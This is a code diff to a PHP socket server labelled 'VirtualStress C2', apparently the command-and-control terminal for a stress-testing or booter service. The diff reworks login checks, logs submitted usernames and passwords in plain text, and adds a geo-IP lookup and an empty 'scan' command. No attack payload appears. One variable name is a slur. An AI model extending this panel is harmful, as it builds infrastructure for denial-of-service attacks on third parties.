@@ -57,15 +57,23 @@ while (true)
         socket_write($newsock, $banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"]), strlen($banner->main_banner($config->Colors["Red"], $config->Colors["Purple"], $config->Colors["Reset"])));
         socket_write($newsock, "Welcome To VirtualStress C2!\r\n", strlen("Welcome To VirtualStress C2!\r\n"));
         socket_getpeername($newsock, $client_ip, $client_port);
-        $usrname = getInput($newsock, "Username: ", 3);
-        $passwd = getInput($newsock, "Password: ", 3);
+        $usrname = alt_getInput($newsock, "Username: ", 3);
+        $passwd = alt_getInput($newsock, "Password: ", 3);
+        echo "# [ NEW LOGIN ATTEMPT ] #\r\n$usrname | $passwd\r\n\r\n";
+        $gay = $crud->user($client_ip, "all");
         $user_info = explode(",", $gay);
-        if($usrname == $user_info[0] || $passwd == $user_info[2]) {
-            $crud->log_session($client_ip, $user_info[0]);
-            socket_write($newsock, "Successfully signed in, Welcome: ". $usrname. "\r\n", strlen("Successfully signed in, Welcome: ". $usrname. "\r\n"));
+        if(strpos($usrname, $user_info[0]) !== false && strpos($passwd, $user_info[2]) !== false) {
+            if($client_ip == $user_info[1]) {
+                socket_write($newsock, "[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn", strlen("[+] Successfully signed in, Welcome: ". $usrname. "\r\n$hostn"));
+            } else {
+                socket_write($newsock, "[x] Invalid matching IP!", strlen("[x] Invalid matching IP!"));
+                sleep(1);
+                socket_close($newsock);
+            }
         } else {
             socket_write($newsock, "[x] Invalid Info\r\n", strlen("[x] Invalid Info\r\n"));
-            // socket_close($newsock);
+            sleep(1);
+            socket_close($newsock);
         }
 
         if (is_resource($newsock))
@@ -113,29 +121,28 @@ while (true)
                     */
 
 
-                    $User_Info = $crud->Get_Current_Info($client_ip);
-                    $get_usrn = explode(",", $User_Info)[0];
-                    $config->GetUserInfo($get_usrn);
-                    echo $config->CurrentUser["Username"]. " | ". $config->CurrentUser["CurrentIP"]. "\r\n\r\n";
+                    $User_Info = $crud->user($client_ip, "all");
+                    $config->GetUserInfo($User_Info);
 
                     /*
                     Command Checking
                     */
-                    if($crud->isSignedIn($client_ip)) {
-                        if(strpos($string, "geo") !== false) {
-                            $inputIP = explode(" ", $string)[1];
-                            $response = file_get_contents("https://scrapy.tech/tools/?action=geoip&q=$inputIP");
-                            socket_write($v, "$response\r\n$hostn", strlen("$response\r\n$hostn"));
-                        } else {
-                            socket_write($v, "[x] No command found\r\n$hostn", strlen("[x] No command found\r\n$hostn"));
-                        }
+                    if(strpos($string, "geo") !== false) {
+                        $inputIP = getInput("IP: ");
+                        $response = file_get_contents("https://scrapy.tech/tools/?action=geoip&q=$inputIP");
+                        socket_write($v, "$response\r\n$hostn", strlen("$response\r\n$hostn"));
+                    } else if(strpos($string, "scan")) {
+
                     } else {
-                        socket_write($v, "$hostn", strlen("$hostn"));
-                        // socket_close($v);
+                            socket_write($v, "[x] No command found\r\n$hostn", strlen("[x] No command found\r\n$hostn"));
                     }
                     /*
                     END OF COMMAND CHECKING
                     */
+
+                    
+                    echo $config->CurrentUser["Username"]. " | ". $config->CurrentUser["CurrentIP"]. "\r\n[Command]: ". $string. "\r\n\r\n";
+
                 }
             }
         }
@@ -143,18 +150,26 @@ while (true)
     // sleep(1);
 }
 
-
-function getInput($socket, $str, $i) {
+function alt_getInput($socket, $str, $i) {
     $FetchedInput = "";
     $checking_characters = false;
 
     socket_write($socket, $str, strlen($str));
     sleep($i);
-    $sokc = socket_recv($v, $string, 1024, MSG_DONTWAIT);
+    $sokc = socket_recv($socket, $string, 1024, MSG_DONTWAIT);
+    $FetchedInput = $string;
 
-    echo $string;
+    $fix = str_replace("/\r|\n/", (string)null, $FetchedInput);
+    $fix2 = str_replace("\r", (string)null, $fix);
+    return str_replace("\n", (string)null, $fix2);
+}
 
-    return $checking_characters;
+
+function getInput($socket, $str, $i) {
+    $data = socket_read($socket, 1024, PHP_NORMAL_READ);
+    if(!$data == false) {
+        return $data;
+    }
 }
 
 function logg($str)
